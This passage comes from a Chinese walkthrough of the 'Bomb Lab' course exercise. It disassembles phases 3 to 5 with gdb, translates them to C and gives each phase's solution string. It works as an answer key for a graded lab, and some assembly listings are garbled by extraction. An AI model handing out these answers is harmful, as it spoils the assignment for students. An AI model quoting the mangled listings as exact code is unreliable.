<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (nums[<span class="number">0</span>]) &#123;                          *<span class="comment">// result in %eax*   </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: result = <span class="number">0xcf</span>; <span class="keyword">break</span>;           *<span class="comment">// 0x400f7c*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: result = <span class="number">0x137</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400fb9*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: result = <span class="number">0x2c3</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f83*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: result = <span class="number">0x100</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f8a*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: result = <span class="number">0x185</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f91*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: result = <span class="number">0xce</span>; <span class="keyword">break</span>;           *<span class="comment">// 0x400f98*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: result = <span class="number">0x2aa</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f9f*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: result = <span class="number">0x147</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400fa6* &#125;                                           *// 0x400fbe* </span></span><br><span class="line"><span class="keyword">if</span> (result != nums[<span class="number">1</span>])                      *<span class="comment">// nums[1] = 0xc(%rsp)*    explode_bomb(); </span></span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>通过这段代码，可以发现 <code>nums[0]</code> 经跳转后得到的新数 <code>result</code> 就应当为 <code>nums[1]</code>，</p>
<p>于是得到本关的 8 组解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 207&#96;, &#96;1 311&#96;, &#96;2 707&#96;, &#96;3 256&#96;, &#96;4 389&#96;, &#96;5 206&#96;, &#96;6 682&#96;, &#96;7 327</span><br></pre></td></tr></table></figure>

<p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0207</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Halfway there!</span><br></pre></td></tr></table></figure>

<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><h3 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h3><p>找到<code>phase_4</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_4&gt;:</span><br><span class="line"> 40100c:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line"> 401010:  48 8d 4c 24 0c         lea    0xc(%rsp),%rcx</span><br><span class="line"> 401015:  48 8d 54 24 08         lea    0x8(%rsp),%rdx</span><br><span class="line"> 40101a:  be cf 25 40 00         mov    $0x4025cf,%esi</span><br><span class="line"> 40101f:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line"> 401024:  e8 c7 fb ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 401029:  83 f8 02               cmp    $0x2,%eax</span><br><span class="line"> 40102c:  75 07                  jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line"> 40102e:  83 7c 24 08 0e         cmpl   $0xe,0x8(%rsp)</span><br><span class="line"> 401033:  76 05                  jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line"> 401035:  e8 00 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 40103a:  ba 0e 00 00 00         mov    $0xe,%edx</span><br><span class="line"> 40103f:  be 00 00 00 00         mov    $0x0,%esi</span><br><span class="line"> 401044:  8b 7c 24 08            mov    0x8(%rsp),%edi</span><br><span class="line"> 401048:  e8 81 ff ff ff         callq  400fce &lt;func4&gt;</span><br><span class="line"> 40104d:  85 c0                  test   %eax,%eax</span><br><span class="line"> 40104f:  75 07                  jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line"> 401051:  83 7c 24 0c 00         cmpl   $0x0,0xc(%rsp)</span><br><span class="line"> 401056:  74 05                  je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line"> 401058:  e8 dd 03 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 40105d:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line"> 401061:  c3                     retq</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsp + 8</span><br><span class="line">%rcx &#x3D; %rsp + 12</span><br></pre></td></tr></table></figure>

<p>由上一关的分析，本关密码同样应当是输入 2 个整数（之间有且仅有一个空格），这 2 个整数将被保存在之前 2 个参数所提供的 2 个地址中。</p>
<p>因此读取完毕后，栈内保存的信息为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x8(%rsp) &#x3D; nums[0]</span><br><span class="line">0xc(%rsp) &#x3D; nums[1]</span><br></pre></td></tr></table></figure>

<p>其中，<code>nums[0]</code> 和 <code>nums[1]</code> 表示输入的字符串中解析得到的（前）2 个整数。</p>
<p>401029: <code>cmp $0x2,%eax</code> 和 40102c: <code>jne 401035</code> 判断函数 <code>sscanf</code> 的返回值是否等于 <code>2</code>，是则继续执行之后的语句，否则直接跳到 401035: <code>callq 40143a</code> 引爆炸弹。同上一关的说明，即检查是否成功读入且仅读入了 2 个整数，如果不是则直接引爆炸弹。</p>
<p>40102e: <code>cmpl $0xe,0x8(%rsp)</code> 和 401033: <code>jbe 40103a</code> 判断 <code>0x8(%rsp)</code> 的值（即 <code>nums[0]</code>，也就是输入的第 1 个整数）是否不超过 <code>14</code>，是则直接跳到 40103a: <code>mov $0xe,%edx</code>，否则执行 401035: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 1 个整数应当不超过 <code>14</code>（无符号数），即其取值范围为 [0, 14]。</p>
<p>40103a: <code>mov $0xe,%edx</code>、40103f: <code>mov $0x0,%esi</code> 和 401044: <code>mov 0x8(%rsp),%edi</code> 将 %edx、%esi、%edi 寄存器分别赋值为 <code>0xe</code>、<code>0x0</code>、<code>0x8(%rsp)</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%edi &#x3D; 0x8(%rsp) &#x3D; nums[0]</span><br><span class="line">%esi &#x3D; 0</span><br><span class="line">%edx &#x3D; 14</span><br></pre></td></tr></table></figure>

<p>401048: <code>callq 400fce</code> 调用函数 <code>func4</code>，也就是本关的主体部分。</p>
<h5 id="4-2-2-观察函数-func4"><a href="#4-2-2-观察函数-func4" class="headerlink" title="4.2.2 观察函数 func4"></a>4.2.2 观察函数 func4</h5><p>在 bomb.asm 中找到函数 <code>func4</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;func4&gt;:  400fce:   48 83 ec 08</span><br><span class="line">sub    $0x8,%rsp  400fd2:   89 d0                  </span><br><span class="line">mov    %edx,%eax  400fd4:   29 f0                   </span><br><span class="line">sub    %esi,%eax  400fd6:   89 c1                 </span><br><span class="line">mov    %eax,%ecx  400fd8:   c1 e9 1f             </span><br><span class="line">shr    $0x1f,%ecx  400fdb:   01 c8                   </span><br><span class="line">add    %ecx,%eax  400fdd:   d1 f8                 </span><br><span class="line">sar    %eax  400fdf:   8d 0c 30               </span><br><span class="line">lea    (%rax,%rsi,1),%ecx  400fe2:   39 f9               </span><br><span class="line">cmp    %edi,%ecx  400fe4:   7e 0c                 </span><br><span class="line">jle    400ff2 &lt;func4+0x24&gt;  400fe6:   8d 51 ff          </span><br><span class="line">lea    -0x1(%rcx),%edx  400fe9:   e8 e0 ff ff ff         </span><br><span class="line">callq  400fce &lt;func4&gt;  400fee:   01 c0                 </span><br><span class="line">add    %eax,%eax  400ff0:   eb 15                   </span><br><span class="line">jmp    401007 &lt;func4+0x39&gt;  400ff2:   b8 00 00 00 00       </span><br><span class="line">mov    $0x0,%eax  400ff7:   39 f9                   </span><br><span class="line">cmp    %edi,%ecx  400ff9:   7d 0c                   </span><br><span class="line">jge    401007 &lt;func4+0x39&gt;  400ffb:   8d 71 01             </span><br><span class="line">lea    0x1(%rcx),%esi  400ffe:   e8 cb ff ff ff        </span><br><span class="line">callq  400fce &lt;func4&gt;  401003:   8d 44 00 01           </span><br><span class="line">lea    0x1(%rax,%rax,1),%eax  401007:   48 83 c4 08        </span><br><span class="line">add    $0x8,%rsp  40100b:   c3                     </span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>400fe9 和 400ffe: <code>callq 400fce</code> 都调用了函数 <code>func4</code> 自身，可见这是一个递归函数。</p>
<p>试译成 C 语言代码（经整理及部分改写，类似 2.2.3 节的处理流程）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*<span class="comment">// key in %edi, low in %esi, high in %edx* </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;   </span><br><span class="line">	<span class="keyword">int</span>      length   = high - low;             *<span class="comment">// length in %eax*   </span></span><br><span class="line">	<span class="keyword">unsigned</span> sign     = length &gt;&gt; <span class="number">31</span>;           *<span class="comment">// sign in %ecx*    </span></span><br><span class="line">	<span class="keyword">int</span>      half_len = (length + sign) &gt;&gt; <span class="number">1</span>;   *<span class="comment">// half_len in %eax*                                                *// half_len = length /= 2*    </span></span><br><span class="line">	<span class="keyword">int</span> mid = half_len + low;                   *<span class="comment">// mid in %ecx*    </span></span><br><span class="line">	<span class="keyword">int</span> result;                                 *<span class="comment">// result in %eax*    </span></span><br><span class="line">	<span class="keyword">if</span> (mid &gt; key) &#123;       </span><br><span class="line">	high   = mid - <span class="number">1</span>;        </span><br><span class="line">	result = func4(key, low, high) * <span class="number">2</span>;    </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid &gt;= key) &#123;                    *<span class="comment">// </span></span><br><span class="line">	mid == key*        result = <span class="number">0</span>;    &#125; </span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;                                    *<span class="comment">// mid &lt; key*        </span></span><br><span class="line">		low    = mid + <span class="number">1</span>;        </span><br><span class="line">		result = func4(key, low, high) * <span class="number">2</span> + <span class="number">1</span>;    </span><br><span class="line">	&#125;    </span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4-2-3-回到函数-phase-4"><a href="#4-2-3-回到函数-phase-4" class="headerlink" title="4.2.3 回到函数 phase_4"></a>4.2.3 回到函数 phase_4</h5><blockquote>
<p>%eax = func4(nums[0], 0, 14)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1234567  40104d:   85 c0                   test   %eax,%eax</span><br><span class="line">  40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  401061:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>40104d: <code>test %eax,%eax</code> 和 40104f: <code>jne 401058</code> 判断函数 <code>func4</code> 的返回值是否为 <code>0</code>，是则继续执行之后的语句，否则直接跳到 401058: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 1 个整数 <code>nums[0]</code> 需要使函数 <code>func4(nums[0], 0, 14)</code> 的返回值为 <code>0</code>，其中 <code>nums[0]</code> 的取值范围为 [0, 14]。</p>
<p>401051: <code>cmpl $0x0,0xc(%rsp)</code> 和 401056: <code>je 40105d</code> 判断 <code>0xc(%rsp)</code> 的值（即 <code>nums[1]</code>，也就是输入的第 2 个整数）是否为 <code>0</code>，是则直接跳到 40105d: <code>add $0x18,%rsp</code> 弹栈返回，否则执行 401058: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 2 个整数应当为 <code>0</code>。</p>
<h5 id="4-2-4-确定输入的第-1-个整数"><a href="#4-2-4-确定输入的第-1-个整数" class="headerlink" title="4.2.4 确定输入的第 1 个整数"></a>4.2.4 确定输入的第 1 个整数</h5><p>事实上，由于 <code>nums[0]</code> 的取值范围有限，直接遍历然后测试返回值是否为 <code>0</code> 即可。测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solution</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> kBegin = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> kEnd   = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The solutions are:"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = kBegin; i &lt;= kEnd; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (func4(i, kBegin, kEnd) == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" %d"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">The solutions are: 0 1 3 7</span><br></pre></td></tr></table></figure>

<p>即为第 1 个整数可能的值。</p>
<p>综上，本关密码即为 <code>0 0</code>, <code>1 0</code>, <code>3 0</code>, <code>7 0</code>。</p>
<h5 id="4-2-5-测试"><a href="#4-2-5-测试" class="headerlink" title="4.2.5 测试"></a>4.2.5 测试</h5><p>这里以 <code>7 0</code> 为例，在 gdb 中输入 Phase 4 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">7 0</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">So you got that one.  Try this one.</span><br></pre></td></tr></table></figure>

<h3 id="5-Phase-5-pointers"><a href="#5-Phase-5-pointers" class="headerlink" title="5. Phase 5: pointers"></a>5. Phase 5: pointers</h3><h4 id="5-1-本关密码"><a href="#5-1-本关密码" class="headerlink" title="5.1 本关密码"></a>5.1 本关密码</h4><p><code>9ON567</code>（不唯一）</p>
<h4 id="5-2-解题过程"><a href="#5-2-解题过程" class="headerlink" title="5.2 解题过程"></a>5.2 解题过程</h4><blockquote>
<p>%rdi = input</p>
</blockquote>
<h5 id="5-2-1-观察函数-phase-5"><a href="#5-2-1-观察函数-phase-5" class="headerlink" title="5.2.1 观察函数 phase_5"></a>5.2.1 观察函数 phase_5</h5><p>在 bomb.asm 中找到函数 <code>phase_5</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_5&gt;:</span><br><span class="line"> 401062:   53                      push   %rbx</span><br><span class="line"> 401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line"> 401067:   48 89 fb                mov    %rdi,%rbx</span><br><span class="line"> 40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line"> 401071:   00 00</span><br><span class="line"> 401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line"> 401078:   31 c0                   xor    %eax,%eax</span><br><span class="line"> 40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line"> 40107f:   83 f8 06                cmp    $0x6,%eax</span><br><span class="line"> 401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line"> 401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line"> 40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line"> 40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line"> 401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line"> 401096:   83 e2 0f                and    $0xf,%edx</span><br><span class="line"> 401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line"> 4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line"> 4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line"> 4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line"> 4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"> 4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line"> 4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi</span><br><span class="line"> 4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line"> 4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line"> 4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line"> 4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line"> 4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line"> 4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line"> 4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"> 4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line"> 4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line"> 4010e5:   00 00</span><br><span class="line"> 4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line"> 4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line"> 4010f2:   5b                      pop    %rbx</span><br><span class="line"> 4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>401067: <code>mov %rdi,%rbx</code> 将 %rdi 寄存器上保存的地址传给了 %rbx 寄存器。</p>
<blockquote>
<p>%rbx = %rdi = input</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line"> ...</span><br><span class="line"> 40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line"> 401071:   00 00</span><br><span class="line"> 401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line"> ...</span><br><span class="line"> 4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line"> 4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line"> 4010e5:   00 00</span><br><span class="line"> 4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line"> 4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line"> 4010f2:   5b                      pop    %rbx</span><br><span class="line"> 4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>这里的 <code>%fs:0x28</code> 是 FS 段寄存器（segment register）上偏移地址 <code>0x28</code> 上的数据。这是一个随机量，在这里起到 stack canary 的作用 。这部分代码即利用这个 stack canary 来确保 <code>0x18(%rsp)</code> 的数值（即栈底的 8 bytes）在函数前后没有发生改动，如果发生改动则执行 4010e9: <code>callq 400b30 &lt;__stack_chk_fail@plt&gt;</code> 调用系统函数 <code>__stack_chk_fail</code> 跳出，从而防止栈溢出（stack overflow）的问题。事实上，这段代码与本关的关系不大，这里就不做更多阐述了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12345  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">40107f:   83 f8 06                cmp    $0x6,%eax</span><br><span class="line">401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>

<p>401078: <code>xor %eax,%eax</code> 将 %eax 寄存器设置为 <code>0</code>。</p>
<blockquote>
<p>%eax = 0</p>
</blockquote>
<p>40107a: <code>callq 40131b</code> 调用函数 <code>string_length</code>。由 1.2.4 节的分析，函数 <code>string_length</code> 的返回值就是字符串 <code>input</code> 的长度。</p>
<p>40107f: <code>cmp $0x6,%eax</code> 和 401082: <code>je 4010d2</code> 判断返回值是否为 <code>6</code>，是则直接跳到 4010d2: <code>mov $0x0,%eax</code>，否则执行 401084: <code>callq 40143a</code> 引爆炸弹。</p>
<p>可见，输入的字符串的长度应当为 <code>6</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line">401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line">401096:   83 e2 0f                and    $0xf,%edx</span><br><span class="line">401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi</span><br><span class="line">4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>剩下的内容也就是本关的主体部分。直观起见，试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cur_char = <span class="number">0</span>;                                   <span class="comment">// cur_char in %rcx</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; ++i) &#123;                      <span class="comment">// i in %rax</span></span><br><span class="line">    cur_char = input[i];                        <span class="comment">// input in %rbx</span></span><br><span class="line">    index    = cur_char;                        <span class="comment">// index in %rsp, later copied to %edx</span></span><br><span class="line">    index &amp;= <span class="number">0xf</span>;</span><br><span class="line">    target_char = target[index];                <span class="comment">// target_char in %edx, target in 0x4024b0</span></span><br><span class="line">    <span class="keyword">word</span>[i]     = target_char;                  <span class="comment">// word in %rsp + 0x10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">word</span>[<span class="number">6</span>] = <span class="string">'\0'</span>;</span><br><span class="line">result  = strings_not_equal(<span class="keyword">word</span>, <span class="number">0x40245e</span>);    <span class="comment">// result in %eax</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>)</span><br><span class="line">    explode_bomb();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>其中，由 1.2.5 节的分析，函数 <code>strings_not_equal</code> 的作用为检查两个字符串是否相等，是则返回 <code>0</code>，否则返回 <code>1</code>。同时也可以知道 <code>0x40245e</code> 这个地址指向的是一个字符串。</p>
<p>可见，这段代码的作用为：</p>
<ol>
<li>构造一个 6 位的新字符串 <code>word</code>，遍历输入的字符串 <code>input</code> 的 6 个字符，以字符 <code>input[i]</code> 的最低 4 位二进制数为索引 <code>index</code>，依次将 <code>word[i]</code> 设置为字符 <code>target[index]</code>（可以推测出 <code>0x4024b0</code> 这个地址指向的也是一个字符串，这里设为 <code>target</code>），最后将 <code>word[6]</code> 设置为 <code>&#39;\0&#39;</code> 作为字符串结束符；</li>
<li>检查字符串 <code>word</code> 和 <code>0x40245e</code> 指向的字符串是否相等，是则直接返回，否则引爆炸弹。</li>
</ol>
<p>因此，由 <code>0x40245e</code> 指向的字符串倒推得对应的 6 个索引 <code>index</code>，再根据这些 <code>index</code> 得到输入的字符串 <code>input</code> 的 6 个字符，就可以得到本关的密码。</p>
<h5 id="5-2-2-确定目标字符串-word-的值"><a href="#5-2-2-确定目标字符串-word-的值" class="headerlink" title="5.2.2 确定目标字符串 word 的值"></a>5.2.2 确定目标字符串 word 的值</h5><p>使用 gdb 查看地址 <code>0x40245e</code> 存放的内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> 复制</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(gdb) x/s <span class="number">0x40245e</span></span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 复制</span><br><span class="line">1</span><br><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>

<p>这就是我们需要构造的目标字符串 <code>word</code> 的值。</p>
<h5 id="5-2-3-确定-6-个索引-index-的值"><a href="#5-2-3-确定-6-个索引-index-的值" class="headerlink" title="5.2.3 确定 6 个索引 index 的值"></a>5.2.3 确定 6 个索引 index 的值</h5><p>使用 gdb 查看地址 <code>0x4024b0</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) x&#x2F;s 0x4024b0</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure>

<p>这就是字符串 <code>target</code> 的值，我们需要将 <code>word[i]</code> 分别设置为字符 <code>target[index]</code>。于是得到对应的 6 个 <code>index</code> 的值为：<code>0x9</code>, <code>0xf</code>, <code>0xe</code>, <code>0x5</code>, <code>0x6</code>, <code>0x7</code>（<code>index</code> 是 4 位二进制数，因此其取值范围为 [0x0, 0xf]）。</p>
<h5 id="5-2-4-确定输入的-6-个字符"><a href="#5-2-4-确定输入的-6-个字符" class="headerlink" title="5.2.4 确定输入的 6 个字符"></a>5.2.4 确定输入的 6 个字符</h5><p>由于索引 <code>index</code> 是字符 <code>input[i]</code> 的最后 4 位（二进制），通过 ASCII 码表 [^6] 找到最后 4 位为 <code>index</code> 的字符即可。于是得到对应的 6 个字符为：<code>9</code>, <code>O</code>, <code>N</code>, <code>5</code>, <code>6</code>, <code>7</code>（答案不唯一，这里就不一一列举了）。</p>
<p>因此，本关密码即为 <code>9ON567</code>。</p>
<h5 id="5-2-5-测试"><a href="#5-2-5-测试" class="headerlink" title="5.2.5 测试"></a>5.2.5 测试</h5><p>在 gdb 中输入 Phase 5 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">9ON567</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">Good work!  On to the next...</span><br></pre></td></tr></table></figure>

<h3 id="6-Phase-6-linked-lists-pointers-structs"><a href="#6-Phase-6-linked-lists-pointers-structs" class="headerlink" title="6. Phase 6: linked lists / pointers / structs"></a>6. Phase 6: linked lists / pointers / structs</h3><h4 id="6-1-本关密码"><a href="#6-1-本关密码" class="headerlink" title="6.1 本关密码"></a>6.1 本关密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>

<h4 id="6-2-解题过程"><a href="#6-2-解题过程" class="headerlink" title="6.2 解题过程"></a>6.2 解题过程</h4><blockquote>
<p>%rdi = input</p>
</blockquote>
<h5 id="6-2-0-观察函数-phase-6"><a href="#6-2-0-观察函数-phase-6" class="headerlink" title="6.2.0 观察函数 phase_6"></a>6.2.0 观察函数 phase_6</h5><p>在 bomb.asm 中找到函数 <code>phase_6</code> 对应的汇编语句：</p>
